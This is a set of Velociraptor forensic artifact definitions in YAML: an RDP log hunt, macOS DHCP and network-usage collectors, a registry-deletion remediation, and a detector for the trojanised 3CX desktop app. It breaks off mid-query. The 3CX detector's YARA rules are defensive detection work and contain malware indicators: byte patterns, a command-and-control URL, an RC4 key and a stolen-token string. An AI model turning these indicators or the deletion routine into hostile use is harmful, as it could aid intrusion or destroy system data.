            `50331699` = "The connection has been disconnected because the session timeout limit was reached.",
            `50331700` = "Your computer can't connect to the remote computer because an invalid cookie was sent to the Remote Desktop Gateway server. Contact your network administrator for assistance.",
            `50331701` = "Your computer can't connect to the remote computer because the cookie was rejected by the Remote Desktop Gateway server. Contact your network administrator for assistance.",
            `50331703` = "Your computer can't connect to the remote computer because the Remote Desktop Gateway server is expecting an authentication method different from the one attempted. Contact your network administrator for assistance.",
            `50331704` = "The RD Gateway connection ended because periodic user authentication failed. Try reconnecting with a correct user name and password. If the reconnection fails, contact your network administrator for further assistance.",
            `50331705` = "The RD Gateway connection ended because periodic user authorization failed. Try reconnecting with a correct user name and password. If the reconnection fails, contact your network administrator for further assistance.",
            `50331707` = "Your computer can't connect to the remote computer because the Remote Desktop Gateway and the remote computer are unable to exchange policies. This could happen due to one of the following reasons: 1. The remote computer  is not capable of exchanging policies with the Remote Desktop Gateway. 2. The remote computer's configuration does not permit a new connection. 3. The connection between the Remote Desktop Gateway and the remote computer ended. Contact your network  administrator for assistance.",
            `50331708` = "Your computer can't connect to the remote computer, possibly because the smart card is not valid, the smart card certificate was not found in the certificate store, or the Certificate Propagation service is not running.  Contact your network administrator for assistance.",
            `50331709` = "To use this program or computer, first log on to the following website",
            `50331710` = "To use this program or computer, you must first log on to an authentication website. Contact your network administrator for assistance.",
            `50331711` = "Your session has ended. To continue using the program or computer, first log on to the following website:.",
            `50331712` = "Your session has ended. To continue using the program or computer, you must first log on to an authentication website. Contact your network administrator for assistance.",
            `50331713` = "The RD Gateway connection ended because periodic user authorization failed. Your computer or device didn't pass the Network Access Protection (NAP) requirements set by your network administrator. Contact your network administrator  for assistance.",
            `50331714` = "Your computer can't connect to the remote computer because the size of the cookie exceeded the supported size. Contact your network administrator for assistance.",
            `50331716` = "Your computer can't connect to the remote computer using the specified forward proxy configuration. Contact your network administrator for assistance.",
            `50331717` = "This computer cannot connect to the remote resource because you do not have permission to this resource. Contact your network administrator for assistance.",
            `50331718` = "There are currently no resources available to connect to. Retry the connection or contact your network administrator.",
            `50331719` = "An error occurred while Remote Desktop Connection was accessing this resource. Retry the connection or contact your system administrator.",
            `50331721` = "Your Remote Desktop Client needs to be updated to the newest version. Contact your system administrator for help installing the update, and then try again.",
            `50331722` = "Your network configuration doesn't allow the necessary HTTPS ports. Contact your network administrator for help allowing those ports or disabling the web proxy, and then try connecting again.",
            `50331723` = "We're setting up more resources, and it might take a few minutes. Please try again later.",
            `50331724` = "The user name you entered does not match the user name used to subscribe to your applications. If you wish to sign in as a different user please choose Sign Out from the Home menu.",
            `50331725` = "Looks like there are too many users trying out the Azure RemoteApp service at the moment. Please wait a few minutes and then try again.",
            `50331726` = "Maximum user limit has been reached. Please contact your administrator for further assistance.",
            `50331727` = "Your trial period for Azure RemoteApp has expired. Ask your admin or tech support for help.",
            `50331728` = "You no longer have access to Azure RemoteApp. Ask your admin or tech support for help."
        )

        -- firstly set timebounds for performance
        LET DateAfterTime <= if(condition=DateAfter,
            then=timestamp(epoch=DateAfter),
            else=timestamp(epoch="1600-01-01")
        )
        LET DateBeforeTime <= if(condition=DateBefore,
            then=timestamp(epoch=DateBefore),
            else=timestamp(epoch="2200-01-01")
        )
        
        -- expand provided glob into a list of paths on the file system (fs)
        LET fspaths <= SELECT FullPath
        FROM glob(globs=expand(path=EvtxGlob))
        
        -- function returning list of VSS paths corresponding to path
        LET vsspaths(path) = SELECT FullPath
        FROM Artifact.Windows.Search.VSS(SearchFilesGlob=path)
      
        LET retrieveRecords(PathList) =
          SELECT * 
          FROM
            foreach(
              row=PathList,
              query={
                SELECT
                  System.EventRecordID as EventRecordID,
                  timestamp(epoch=int(int=System.TimeCreated.SystemTime)) as EventTime,
                  System.TimeCreated.SystemTime as EventTimeFloat,
                  System.EventID.Value as EventID,
                  System.Correlation.ActivityID as ActivityID,
                  System.Computer as SourceHost,
                  System.Security.UserID as SourceUserSID,
                  if(condition=System.EventID.Value=1026, then=EventData.Value, else=null) as DisconnectReasonID,
                  if(condition=System.EventID.Value=1026, then=get(item=DisconnectReasonLookup,member=str(str=EventData.Value),default='Unknown'), else=null) as DisconnectReason,
                  if(condition=System.EventID.Value=1024, then=EventData.Value, else=null) as DestinationHost,
                  if(condition=System.EventID.Value=1027, then=EventData.DomainName, else=null) as ConnectedDomain,
                  if(condition=System.EventID.Value=1029, then=EventData.Data.Value, else=null) as DestinationUsernameHash
                FROM parse_evtx(filename=FullPath)
                WHERE EventID IN (1024,1026,1027,1029)
                AND EventTime < DateBeforeTime
                AND EventTime > DateAfterTime
              }
            )
          GROUP BY EventRecordID
        
        LET evtxsearch(PathList) = 
          SELECT 
            min(item=EventTime) as Start,
            max(item=EventTime) as End,
            max(item=EventTimeFloat)-min(item=EventTimeFloat) as Duration,
            SourceUserSID,
            lookupSID(sid=SourceUserSID) as SourceUser,
            SourceHost,
            { SELECT _value FROM foreach(row=enumerate(items=DestinationHost)) WHERE _value != NULL LIMIT 1 } as DestinationHost,
            { SELECT _value FROM foreach(row=enumerate(items=ConnectedDomain)) WHERE _value != NULL LIMIT 1 } as ConnectedDomain,
            { SELECT _value FROM foreach(row=enumerate(items=DestinationUsernameHash)) WHERE _value!= NULL LIMIT 1 } as DestinationUsernameHash,
            join(array=array(a1={ SELECT _value FROM foreach(row=enumerate(items=DisconnectReasonID)) WHERE _value!= NULL }), sep=' | ') as DisconnectReasonID,
            join(array=array(a1={ SELECT _value FROM foreach(row=enumerate(items=DisconnectReason)) WHERE _value!= NULL }), sep=' | ') as DisconnectReason
          FROM retrieveRecords(PathList=PathList)
          GROUP BY ActivityID

        -- include VSS in calculation and deduplicate with GROUP BY by file
        LET include_vss =
          SELECT * FROM foreach(
            row=fspaths,
            query={ SELECT * FROM evtxsearch(PathList={ SELECT FullPath FROM vsspaths(path=FullPath) }) }
          )

        -- exclude VSS in EvtxHunt`
        LET exclude_vss = SELECT *
          FROM evtxsearch(PathList={SELECT FullPath FROM fspaths})

        -- return rows
        SELECT * FROM if(condition=SearchVSS,
          then={ SELECT * FROM include_vss },
          else={ SELECT * FROM exclude_vss })

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Network.DHCP.yaml
======
name: MacOS.Network.DHCP
description: |
    It can be useful to view DHCP lease information on an endpoint.  If the  `LeaseLength`, `RouterIPAddress`, `SSID`, or other values are not as expected,  it could potentially indicate a rogue DHCP server on the network, or just misconfiguration.
    
    Either way, the information provided by this artifact can be used to help defenders find unexpected DHCP lease configuration.
reference:
  - https://attack.mitre.org/techniques/T1557/003/
type: CLIENT
author: Wes Lambert - @therealwlambert|@weslambert@infosec.exchange
parameters:
- name: LeaseGlob
  default: /private/var/db/dhcpclient/leases/*.plist
- name: UploadFiles
  default: 
  type: bool 
precondition:
      SELECT OS From info() where OS = 'darwin'
sources:
  - query: |
      LET LeaseList = SELECT Mtime, OSPath
       FROM glob(globs=split(string=LeaseGlob, sep=","))
       
      SELECT * FROM foreach(row=LeaseList,
                            query={
                                SELECT Mtime,
                                       OSPath,
                                       regex_replace(re='''.plist''', replace='', source=basename(path=OSPath)) AS Interface,
                                       RouterIPAddress,
                                       SSID,	
                                       ClientIdentifier AS _ClientIdentifier,	
                                       IPAddress,	
                                       LeaseLength,	
                                       LeaseStartDate,	
                                       PacketData AS _PacketData,	
                                       RouterHardwareAddress AS _RouterHardwareAddress,
                                       OSPath AS _FullPath
                                FROM plist(file=OSPath)})
  - name: Upload
    query: |
        -- if configured upload DHCP lease files
        SELECT * FROM if(condition=UploadFiles,
            then={
                SELECT
                    upload(file=OSPath) as DHCPLeaseFile
                FROM LeaseList
            })

---END OF FILE---

======
FILE: /content/exchange/artifacts/SmoothOperator.yaml
======
name: Windows.Detection.SmoothOperator
author: "Matt Green - @mgreen27"
description: |
   This artifact searches for evidence of trojanised 3CXDesktopApp.
   
   Currently Windows specific, Yara glob can be repurposed for MacOS. 
   Targeting /Contents/Frameworks/Electron Framework.framework/Versions/A/Libraries/libffmpeg.dylib  
   
   There are three methods of detection:
   
   1. Yara glob - searches known install paths and applies yara looking for binary attributes.
   2. Process Memory - Searches for compromised 3CXDesktopApp running using Windows.System.VAD.
   3. AMCache - Searches for compromised 3CXDesktopApp.exe versions in AMCache.
   
   Impacted 3CXDesktopApp:
   
   - Windows: 18.12.407 & 18.12.416
   - MacOS: 18.11.1213, 18.12.402, 18.12.407 & 18.12.416
   
   NOTE: artifact tested on 0.6.8 - should also work on on 0.6.7.  
   Be aware that the YARA rules are intentionally written in a way that is less strict & may

    1. detect other malicious samples created in the time frame in which the known malicious samples were created
    2. lead to some FPs
    
   Thank you to @cyb3rops for sharing rules.

reference:
  - https://raw.githubusercontent.com/Neo23x0/signature-base/master/yara/gen_mal_3cx_compromise_mar23.yar
  - https://twitter.com/cyb3rops/status/1641130326830333984
  - https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/
  - https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/
type: CLIENT


parameters:
   - name: TargetGlob
     default: C:\Users\*\AppData\*\Programs\3CXDesktopApp\**.{dll,exe}
   - name: UploadHits
     description: Select to upload hits to server.
     type: bool
   - name: TargetYara
     default: |
         import "pe"
         
         rule APT_MAL_NK_3CX_Malicious_Samples_Mar23_1 {
            meta:
               description = "Detects malicious DLLs related to 3CX compromise"
               author = "X__Junior, Florian Roth (Nextron Systems)"
               reference = "https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/"
               date = "2023-03-29"
               score = 85
               hash1 = "7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896"
               hash2 = "c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02"
             strings:
               $op1 = { 4C 89 F1 4C 89 EA 41 B8 40 00 00 00 FF 15 ?? ?? ?? ?? 85 C0 74 ?? 4C 89 F0 FF 15 ?? ?? ?? ?? 4C 8D 4C 24 ?? 45 8B 01 4C 89 F1 4C 89 EA FF 15 } /* VirtualProtect and execute payload*/
               $op2 = { 48 C7 44 24 ?? 00 00 00 00 4C 8D 7C 24 ?? 48 89 F9 48 89 C2 41 89 E8 4D 89 F9 FF 15 ?? ?? ?? ?? 41 83 3F 00 0F 84 ?? ?? ?? ?? 0F B7 03 3D 4D 5A 00 00} /* ReadFile and MZ compare*/
               $op3 = { 41 80 7C 00 ?? FE 75 ?? 41 80 7C 00 ?? ED 75 ?? 41 80 7C 00 ?? FA 75 ?? 41 80 3C 00 CE} /* marker */
               $op4 = { 44 0F B6 CD 46 8A 8C 0C ?? ?? ?? ?? 45 30 0C 0E 48 FF C1} /* xor part in RC4 decryption*/
             condition:
               uint16(0) == 0x5a4d
               and filesize < 3MB 
               and pe.characteristics & pe.DLL
               and 2 of them
         }

         rule APT_MAL_NK_3CX_Malicious_Samples_Mar23_2 {
            meta:
               description = "Detects malicious DLLs related to 3CX compromise (decrypted payload)"
               author = "Florian Roth (Nextron Systems)"
               reference = "https://twitter.com/dan__mayer/status/1641170769194672128?s=20"
               date = "2023-03-29"
               score = 80
               hash1 = "aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973"
            strings:
               $s1 = "raw.githubusercontent.com/IconStorages/images/main/icon%d.ico" wide fullword
               $s2 = "https://raw.githubusercontent.com/IconStorages" wide fullword
               $s3 = "icon%d.ico" wide fullword
               $s4 = "__tutmc" ascii fullword

               $op1 = { 2d ee a1 00 00 c5 fa e6 f5 e9 40 fe ff ff 0f 1f 44 00 00 75 2e c5 fb 10 0d 46 a0 00 00 44 8b 05 7f a2 00 00 e8 0a 0e 00 00 }
               $op4 = { 4c 8d 5c 24 71 0f 57 c0 48 89 44 24 60 89 44 24 68 41 b9 15 cd 5b 07 0f 11 44 24 70 b8 b1 68 de 3a 41 ba a4 7b 93 02 }
               $op5 = { f7 f3 03 d5 69 ca e8 03 00 00 ff 15 c9 0a 02 00 48 8d 44 24 30 45 33 c0 4c 8d 4c 24 38 48 89 44 24 20 }
            condition:
               uint16(0) == 0x5a4d and
               filesize < 900KB and 3 of them
               or 5 of them
         }

         rule APT_MAL_NK_3CX_Malicious_Samples_Mar23_3 {
            meta:
               description = "Detects malicious DLLs related to 3CX compromise (decrypted payload)"
               author = "Florian Roth , X__Junior"
               reference = "https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/"
               date = "2023-03-29"
               score = 80
               hash1 = "aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973"
             strings:
               $opa1 = { 41 81 C0 ?? ?? ?? ?? 02 C8 49 C1 E9 ?? 41 88 4B ?? 4D 03 D1 8B C8 45 8B CA C1 E1 ?? 33 C1 41 69 D0 ?? ?? ?? ?? 8B C8 C1 E9 ?? 33 C1 8B C8 C1 E1 ?? 81 C2 ?? ?? ?? ?? 33 C1 43 8D 0C 02 02 C8 49 C1 EA ?? 41 88 0B 8B C8 C1 E1 ?? 33 C1 44 69 C2 ?? ?? ?? ?? 8B C8 C1 E9 ?? 33 C1 8B C8 C1 E1 ?? 41 81 C0 } /*lcg chunk */
               $opa2 = { 8B C8 41 69 D1 ?? ?? ?? ?? C1 E1 ?? 33 C1 45 8B CA 8B C8 C1 E9 ?? 33 C1 81 C2 ?? ?? ?? ?? 8B C8 C1 E1 ?? 33 C1 41 8B C8 4C 0F AF CF 44 69 C2 ?? ?? ?? ?? 4C 03 C9 45 8B D1 4C 0F AF D7} /*lcg chunk */

               $opb1 = { 45 33 C9 48 89 6C 24 ?? 48 8D 44 24 ?? 48 89 6C 24 ?? 8B D3 48 89 B4 24 ?? ?? ?? ?? 48 89 44 24 ?? 45 8D 41 ?? FF 15 } /* base64 decode */
               $opb2 = { 44 8B 0F 45 8B C6 48 8B 4D ?? 49 8B D7 44 89 64 24 ?? 48 89 7C 24 ?? 44 89 4C 24 ?? 4C 8D 4D ?? 48 89 44 24 ?? 44 89 64 24 ?? 4C 89 64 24 ?? FF 15} /* AES decryption */
               $opb3 = { 48 FF C2 66 44 39 2C 56 75 ?? 4C 8D 4C 24 ?? 45 33 C0 48 8B CE FF 15 ?? ?? ?? ?? 85 C0 0F 84 ?? ?? ?? ?? 44 0F B7 44 24 ?? 33 F6 48 8B 54 24 ?? 45 33 C9 48 8B 0B 48 89 74 24 ?? 89 74 24 ?? C7 44 24 ?? ?? ?? ?? ?? 48 89 74 24 ?? FF 15 } /* internet connection */
               $opb4 = { 33 C0 48 8D 6B ?? 4C 8D 4C 24 ?? 89 44 24 ?? BA ?? ?? ?? ?? 48 89 44 24 ?? 48 8B CD 89 44 24 ?? 44 8D 40 ?? 8B F8 FF 15} /* VirtualProtect */
             condition:
               ( all of ($opa*) )
               or
               ( 1 of ($opa*) and 1 of ($opb*) )
               or
               ( 3 of ($opb*) )
         }

         rule SUSP_APT_MAL_NK_3CX_Malicious_Samples_Mar23_1 {
            meta:
               description = "Detects marker found in malicious DLLs related to 3CX compromise"
               author = "X__Junior, Florian Roth (Nextron Systems)"
               reference = "https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/"
               date = "2023-03-29"
               score = 75
               hash1 = "7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896"
               hash2 = "c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02"
            strings:
               $opx1 = { 41 80 7C 00 FD FE 75 ?? 41 80 7C 00 FE ED 75 ?? 41 80 7C 00 FF FA 75 ?? 41 80 3C 00 CE } 
            condition:
               $opx1
         }

         rule APT_SUSP_NK_3CX_RC4_Key_Mar23_1 {
            meta:
               description = "Detects RC4 key used in 3CX binaries known to be malicious"
               author = "Florian Roth (Nextron Systems)"
               date = "2023-03-29"
               reference = "https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/"
               score = 70
               hash1 = "7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896"
               hash2 = "59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983"
               hash3 = "aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868"
               hash4 = "c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02"
            strings:
               $x1 = "3jB(2bsG#@c7"
            condition:
               ( uint16(0) == 0xcfd0 or uint16(0) == 0x5a4d )
               and $x1
         }

         rule SUSP_3CX_App_Signed_Binary_Mar23_1 {
            meta:
               description = "Detects 3CX application binaries signed with a certificate and created in a time frame in which other known malicious binaries have been created"
               author = "Florian Roth (Nextron Systems)"
               date = "2023-03-29"
               reference = "https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/"
               score = 65
               hash1 = "fad482ded2e25ce9e1dd3d3ecc3227af714bdfbbde04347dbc1b21d6a3670405"
               hash2 = "dde03348075512796241389dfea5560c20a3d2a2eac95c894e7bbed5e85a0acc"
            strings:
               $sa1 = "3CX Ltd1"
               $sa2 = "3CX Desktop App" wide
               $sc1 = { 1B 66 11 DF 9C 9A 4D 6E CC 8E D5 0C 9B 91 78 73 } // Known compromised cert
            condition:
               uint16(0) == 0x5a4d
               and pe.timestamp > 1669680000 // 29.11.2022 earliest known malicious sample 
               and pe.timestamp < 1680108505 // 29.03.2023 date of the report
               and all of ($sa*)
               and $sc1 // serial number of known compromised certificate
         }

         rule SUSP_3CX_MSI_Signed_Binary_Mar23_1 {
            meta:
               description = "Detects 3CX MSI installers signed with a known compromised certificate and signed in a time frame in which other known malicious binaries have been signed"
               author = "Florian Roth (Nextron Systems)"
               date = "2023-03-29"
               reference = "https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/"
               score = 60
               hash1 = "aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868"
               hash2 = "59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983"
            strings:
               $a1 = { 84 10 0C 00 00 00 00 00 C0 00 00 00 00 00 00 46 } // MSI marker

               $sc1 = { 1B 66 11 DF 9C 9A 4D 6E CC 8E D5 0C 9B 91 78 73 } // Known compromised cert

               $s1 = "3CX Ltd1"
               $s2 = "202303" // in 
            condition:
               uint16(0) == 0xcfd0
               and $a1 
               and $sc1 
               and (
                  $s1 in (filesize-20000..filesize)
                  and $s2 in (filesize-20000..filesize)
               )
         }

         rule APT_MAL_macOS_NK_3CX_Malicious_Samples_Mar23_1 {
            meta:
               description = "Detects malicious macOS application related to 3CX compromise (decrypted payload)"
               author = "Florian Roth (Nextron Systems)"
               reference = "https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/"
               date = "2023-03-30"
               score = 80
               hash1 = "b86c695822013483fa4e2dfdf712c5ee777d7b99cbad8c2fa2274b133481eadb"
               hash2 = "ac99602999bf9823f221372378f95baa4fc68929bac3a10e8d9a107ec8074eca"
               hash3 = "51079c7e549cbad25429ff98b6d6ca02dc9234e466dd9b75a5e05b9d7b95af72"
             strings:
               $s1 = "20230313064152Z0"
               $s2 = "Developer ID Application: 3CX (33CF4654HL)"
             condition:
               uint16(0) == 0xfeca and all of them
         }

         /* 30.03.2023 */

         rule APT_MAL_MacOS_NK_3CX_DYLIB_Mar23_1 {
            meta:
               description = "Detects malicious DYLIB files related to 3CX compromise"
               author = "Florian Roth"
               reference = "https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/"
               date = "2023-03-30"
               score = 80
               hash1 = "a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67"
               hash2 = "fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7"
            strings:
               /* XORed UA 0x7a */
               $xc1 = { 37 15 00 13 16 16 1B 55 4F 54 4A 5A 52 2D 13 14 
                        1E 15 0D 09 5A 34 2E 5A 4B 4A 54 4A 41 5A 2D 13
                        14 4C 4E 41 5A 02 4C 4E 53 5A 3B 0A 0A 16 1F 2D
                        1F 18 31 13 0E 55 4F 49 4D 54 49 4C 5A 52 31 32
                        2E 37 36 56 5A 16 13 11 1F 5A 3D 1F 19 11 15 53
                        5A 39 12 08 15 17 1F 55 4B 4A 42 54 4A 54 4F 49
                        4F 43 54 4B 48 42 5A 29 1B 1C 1B 08 13 55 4F 49
                        4D 54 49 4C 7A }
               /* /;3cx_auth_token_content=%s;__tutma= */
               $xc2 = { 41 49 19 02 25 1b 0f 0e 12 25 0e 15 11 1f 14 25 19 15 14 0e 1f 14 0e 47 5f 09 41 25 25 0e 0f 0e 17 1b 47 }
               /* /System/Library/CoreServices/SystemVersion.plist */
               $xc3 = { 55 29 03 09 0e 1f 17 55 36 13 18 08 1b 08 03 55 39 15 08 1f 29 1f 08 0c 13 19 1f 09 55 29 03 09 0e 1f 17 2c 1f 08 09 13 15 14 54 0a 16 13 09 0e }
            condition:
               1 of them
         }

         rule APT_SUSP_NK_3CX_Malicious_Samples_Mar23_1 {
            meta:
               description = "Detects indicator (event name) found in samples related to 3CX compromise"
               author = "Florian Roth"
               reference = "https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/"
               date = "2023-03-30"
               score = 70
               hash1 = "7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896"
               hash2 = "59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983"
               hash3 = "aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868"
               hash4 = "c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02"
            strings:
               $a1 = "AVMonitorRefreshEvent" wide fullword
            condition:
               1 of them
         }

         rule APT_MAL_NK_3CX_Malicious_Samples_Mar23_4 {
             meta:
                 author = "MalGamy"
                 reference = "https://twitter.com/WhichbufferArda/status/1641404343323688964?s=20"
                 description = "Detects decrypted payload loaded inside 3CXDesktopApp.exe which downloads info stealer"
                 date = "2023-03-29"
                 hash = "851c2c99ebafd4e5e9e140cfe3f2d03533846ca16f8151ae8ee0e83c692884b7" 
                 score = 80
             strings:
                 $op1 = {41 69 D0 [4] 8B C8 C1 E9 ?? 33 C1 8B C8 C1 E1 ?? 81 C2 [4] 33 C1 43 8D 0C 02 02 C8 49 C1 EA ?? 41 88 0B 8B C8 C1 E1 ?? 33 C1 44 69 C2 [4] 8B C8 C1 E9 ?? 33 C1 8B C8 C1 E1 ?? 41 81 C0 [4] 33 C1 4C 0F AF CF 4D 03 CA 45 8B D1 4C 0F AF D7 41 8D 0C 11 49 C1 E9 ?? 02 C8} // // xor with mul operation
                 $op2 = {4D 0F AF CC 44 69 C2 [4] 4C 03 C9 45 8B D1 4D 0F AF D4 41 8D 0C 11 41 81 C0 [4] 02 C8 49 C1 E9 ?? 41 88 4B ?? 4D 03 D1 8B C8 45 8B CA C1 E1 ?? 33 C1} // xor with mul operation
                 $op3 = {33 C1 4C 0F AF C7 8B C8 C1 E1 ?? 4D 03 C2 33 C1} // shift operation
             condition: 
                 2 of them
         }

         rule MAL_3CXDesktopApp_MacOS_Backdoor_Mar23 {
             meta:
               author = "X__Junior"
                 reference = "https://www.volexity.com/blog/2023/03/30/3cx-supply-chain-compromise-leads-to-iconic-incident/"
                 description = "Detects 3CXDesktopApp MacOS Backdoor component"
                 date = "2023-03-30"
                 hash = "a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67"
                 score = 80
             strings:
                 $sa1 = "%s/.main_storage" ascii fullword
                 $sa2 = "%s/UpdateAgent" ascii fullword

                 $op1 = { 31 C0 41 80 34 06 ?? 48 FF C0 48 83 F8 ?? 75 ?? BE ?? ?? ?? ?? BA ?? ?? ?? ?? 4C 89 F7 48 89 D9 E8 ?? ?? ?? ?? 48 89 DF E8 ?? ?? ?? ?? 48 89 DF E8 ?? ?? ?? ?? 4C 89 F7 5B 41 5E 41 5F E9 ?? ?? ?? ?? 5B 41 5E 41 5F C3} /* string decryption */
                 $op2 = { 0F 11 84 24 ?? ?? ?? ?? 0F 28 05 ?? ?? ?? ?? 0F 29 84 24 ?? ?? ?? ?? 0F 28 05 ?? ?? ?? ?? 0F 29 84 24 ?? ?? ?? ?? 31 C0 80 B4 04 ?? ?? ?? ?? ?? 48 FF C0} /* string decryption */
             condition:
               ( uint16(0) == 0xfeca and filesize < 6MB
                  and
                  (
                     ( 1 of ($sa*) and 1 of ($op* ) )
                     or all of ($sa*)
                  )
               )
               or ( all of ($op*) )
         }

   - name: VersionRegex
     description: Known comromised 3CXDesktopApp.exe Windows versions to search AMCache.
     default: ^(18\.12\.407\.0|18\.12\.416)$

sources:
  - query: |
      SELECT * FROM Artifact.Generic.Detection.Yara.Glob(
                                                        PathGlob=TargetGlob,
                                                        YaraRule=TargetYara,
                                                        UploadHits=UploadHits )

  - name: VAD - 3CX process
    precondition: |
        SELECT OS From info() where OS = 'windows'
    query: |
        SELECT * FROM Artifact.Windows.System.VAD(
                                                ProcessRegex='3cxdesktopapp.exe',
                                                SuspiciousContent=TargetYara )

  - name: AMCache
    precondition: |
        SELECT OS From info() where OS = 'windows'
    query: |
        LET X = scope()
        SELECT FileId,
               Key.OSPath.Path as Key,
               Key.OSPath.DelegatePath AS Hive,
               Key.Mtime as LastModified,
               X.LowerCaseLongPath as Binary,
               X.Name AS Name,
               X.Size AS Size,
               X.ProductName AS ProductName,
               X.Publisher AS Publisher,
               X.Version AS Version,
               X.BinFileVersion AS BinFileVersion
        FROM foreach(
            row={
                SELECT FullPath FROM glob(globs=expand(path="%SYSTEMROOT%/appcompat/Programs/Amcache.hve"))
                WHERE log(message="Processing "+FullPath)
            }, query={
                SELECT * FROM read_reg_key(
                   globs="/Root/InventoryApplicationFile/*",
                   root=pathspec(DelegatePath=FullPath),
                   accessor='raw_reg' )
            })
        WHERE Name = '3cxdesktopapp.exe'
            AND ( Version =~ VersionRegex
                OR BinVersion =~ VersionRegex )
        
column_types:
  - name: HitContext
    type: preview_upload

---END OF FILE---

======
FILE: /content/exchange/artifacts/RegistryRemediation.yaml
======
name: Windows.Remediation.Registry
author: Matt Green - @mgreen27
description: |
    This artifact uses glob to remove a registry key.
    
    TypeRegex allows targeting of key or value. For service remediation key, for 
    run key remediation SZ or .   
    
    WARNING: PLEASE SCOPE FIRST and use appropriate targeting.
    
type: CLIENT

precondition:
  SELECT * FROM info() where OS = 'windows'

parameters:
  - name: TargetRegistryGlob
    default: HKEY_LOCAL_MACHINE\SYSTEM\{CurrentControlSet,ControlSet*}\Services\ServiceName
    description: Use a glob to define the keys that will be targetted.
  - name: TypeRegex
    default: key
    description: Regex for Registry type. Usually key or SZ or .
  - name: ReallyDoIt
    description: When selected will really remove!
    type: bool

sources:
  - query: |
        SELECT  OSPath, 
                Name,
                Data.type as Type,
                Data.value as Value,
                Mtime as Modified,
                if(condition=ReallyDoIt,
                    then= if(condition= Data.type = 'key',
                        then= reg_rm_key(path=OSPath),
                        else= reg_rm_value(path=OSPath)),
                    else= FALSE ) as Deleted
        FROM glob(globs=TargetRegistryGlob, accessor='registry')
        WHERE Type =~ TypeRegex
        
column_types:
  - name: Modified
    type: timestamp

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Applications.NetworkUsage.yaml
======
name: MacOS.Applications.NetworkUsage
description: |
   On macOS, the NetUsage DB can provide various details around application network utilization. With this artifact, we can get an idea of what applications are utilizing the network for communications and to what degree. We can also identify if usage has occurred through a WIFI network or a wired network.
   
   More information about this database can be found here: 
   
   http://www.mac4n6.com/blog/2019/1/6/network-and-application-usage-using-netusagesqlite-amp-datausagesqlite-ios-databases
reference:
  - http://www.mac4n6.com/blog/2019/1/6/network-and-application-usage-using-netusagesqlite-amp-datausagesqlite-ios-databases

type: CLIENT

author: Wes Lambert - @therealwlambert|@weslambert@infosec.exchange

parameters:
- name: NetUsageGlob
  default: /private/var/networkd/netusage.sqlite,/private/var/networkd/db/netusage.sqlite

precondition:
      SELECT OS From info() where OS = 'darwin'

sources:
  - query: |
      LET NetUsageList = SELECT OSPath
       FROM glob(globs=split(string=NetUsageGlob, sep=","))

      LET NetUsageDetails = SELECT *
        FROM sqlite(file=OSPath, query='''
          SELECT
            DATETIME(ZPROCESS.ZTIMESTAMP + 978307200, 'unixepoch') AS "PROCESS TIMESTAMP",
            DATETIME(ZPROCESS.ZFIRSTTIMESTAMP + 978307200, 'unixepoch') AS "PROCESS FIRST TIMESTAMP",
            DATETIME(ZLIVEUSAGE.ZTIMESTAMP + 978307200, 'unixepoch') AS "LIVE USAGE TIMESTAMP",
            ZBUNDLENAME AS "BUNDLE ID",
            ZPROCNAME AS "PROCESS NAME",
            ZWIFIIN AS "WIFI IN",
            ZWIFIOUT AS "WIFI OUT",
            ZWWANIN AS "WWAN IN",
            ZWWANOUT AS "WWAN OUT",
            ZWIREDIN AS "WIRED IN",
            ZWIREDOUT AS "WIRED OUT",
            ZXIN AS "X IN",
            ZXOUT AS "X OUT",
            ZLIVEUSAGE.Z_PK AS "ZLIVEUSAGE TABLE ID" 
          FROM ZLIVEUSAGE 
            LEFT JOIN ZPROCESS ON ZPROCESS.Z_PK = ZLIVEUSAGE.ZHASPROCESS''')
  
      SELECT timestamp(string=`PROCESS TIMESTAMP`) AS Timestamp,	
        `PROCESS FIRST TIMESTAMP` AS FirstTimestamp,	
        `LIVE USAGE TIMESTAMP` AS LiveUsageTimestamp,
        `BUNDLE ID` AS BundleID,
        `PROCESS NAME` AS ProcessName,	
        `WIFI IN` AS WifiIn,
